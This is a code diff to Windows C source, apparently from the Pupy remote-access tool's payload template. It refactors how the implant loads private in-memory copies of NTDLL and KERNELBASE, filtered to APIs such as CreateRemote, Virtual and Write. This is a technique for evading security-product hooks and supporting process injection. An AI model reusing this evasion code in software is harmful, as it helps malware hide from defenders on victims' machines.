@@ -160,45 +160,17 @@ LPSTR* CommandLineToArgvA(INT *pNumArgs)
 }
 
 #ifdef _PUPY_PRIVATE_NT
+typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
+
 static const PSTR NtDllAllowedPrefixes[] = {"Nt", NULL};
 static const PSTR Kernel32AllowedPrefixes[] = {
     "CreateRemote", "CreateFile", "Delete", "Open",
     "Write", "Read", "Terminate", "Resume", "Virtual",
     "Reg", NULL
 };
-
-typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
-LPFN_ISWOW64PROCESS fnIsWow64Process;
-
-BOOL IsWow64()
-{
-#ifdef WIN_X86
-    BOOL bIsWow64 = TRUE;
-
-    //IsWow64Process is not available on all supported versions of Windows.
-    //Use GetModuleHandle to get a handle to the DLL that contains the function
-    //and GetProcAddress to get a pointer to the function if available.
-
-    fnIsWow64Process = (LPFN_ISWOW64PROCESS) GetProcAddress(
-        GetModuleHandle("kernel32"),"IsWow64Process");
-
-    if(NULL != fnIsWow64Process)
-        fnIsWow64Process(GetCurrentProcess(),&bIsWow64);
-
-    return bIsWow64;
-#else
-    return FALSE;
-#endif
-}
 #endif
 
 void initialize(BOOL isDll, on_exit_session_t *cb) {
-#ifdef _PUPY_PRIVATE_NT
-    HMODULE hNtDll;
-    HMODULE hKernelBase;
-    HMODULE hKernel32;
-#endif
-
     int i, argc = 0;
     char **argv = NULL;
 
@@ -206,46 +178,55 @@ void initialize(BOOL isDll, on_exit_session_t *cb) {
     _pupy_pyd_args_t args;
 #endif
 
-    dprint("TEMPLATE REV: %s\n", GIT_REVISION_HEAD);
-
 #ifdef _PUPY_PRIVATE_NT
-    if (IsWow64()) {
-        dprint("WOW64 + _PUPY_PRIVATE_NT known to be broken right now\n");
-    } else {
-        hNtDll = GetModuleHandleA("NTDLL.DLL");
-        hKernelBase = GetModuleHandleA("KERNELBASE.DLL");
-        hKernel32 = GetModuleHandleA("KERNEL32.DLL");
-    }
+    HMODULE hNtDll = GetModuleHandleA("NTDLL.DLL");
+    HMODULE hKernelBase = GetModuleHandleA("KERNELBASE.DLL");
+    HMODULE hKernel32 = GetModuleHandleA("KERNEL32.DLL");
 
-    if (hNtDll && hKernel32 && hKernelBase)  {
+#ifdef WIN_X64
+    BOOL blIsWow64 = FALSE;
+#else
+    BOOL blIsWow64 = TRUE;
+    LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS) GetProcAddress(
+        hKernel32, "IsWow64Process");
+
+    if (fnIsWow64Process)
+        fnIsWow64Process(GetCurrentProcess(),&blIsWow64);
+#endif
+
+    if (!blIsWow64 && hNtDll && hKernel32 && hKernelBase)  {
         HMODULE hPrivate;
         dprint("Loading private copy of NTDLL/KERNELBASE\n");
 
-        hPrivate = MyLoadLibraryEx("NTDLL.DLL", hNtDll, NULL, TRUE);
+        hPrivate = MyLoadLibraryEx(
+            "NTDLL.DLL", hNtDll, NULL, NtDllAllowedPrefixes,
+            MEMORY_LOAD_FROM_HMODULE | MEMORY_LOAD_EXPORT_FILTER_PREFIX
+        );
+
         if (hPrivate) {
             dprint(
                 "Private copy of NTDLL.DLL loaded to %p (orig: %p)\n",
                 hPrivate, hNtDll
             );
 
-            if (SetAliasedModule(hPrivate, NULL, NtDllAllowedPrefixes, NULL)) {
-                dprint("Allow Nt prefixes for private NTDLL");
-            }
+            hPrivate = MyLoadLibraryEx(
+                "KERNEL32.DLL", hKernelBase, hKernel32,
+                Kernel32AllowedPrefixes,
+                MEMORY_LOAD_FROM_HMODULE | MEMORY_LOAD_ALIASED | \
+                    MEMORY_LOAD_EXPORT_FILTER_PREFIX | MEMORY_LOAD_NO_EP
+            );
 
-            hPrivate = MyLoadLibraryEx("KERNEL32.DLL", hKernelBase, NULL, TRUE);
             if (hPrivate) {
                 dprint(
                     "Private copy of KERNELBASE.DLL loaded to %p as KERNEL32 (orig: %p)\n",
                     hPrivate, hKernel32
                 );
-
-                if (SetAliasedModule(hPrivate, hKernel32, Kernel32AllowedPrefixes, NULL)) {
-                    dprint("Set aliased module for KERNELBASE32.DLL to KERNEL32.DLL");
-                }
             }
         }
     }
 #endif
+
+    dprint("TEMPLATE REV: %s\n", GIT_REVISION_HEAD);
 
 #ifdef DEBUG
     redirect_stdout();
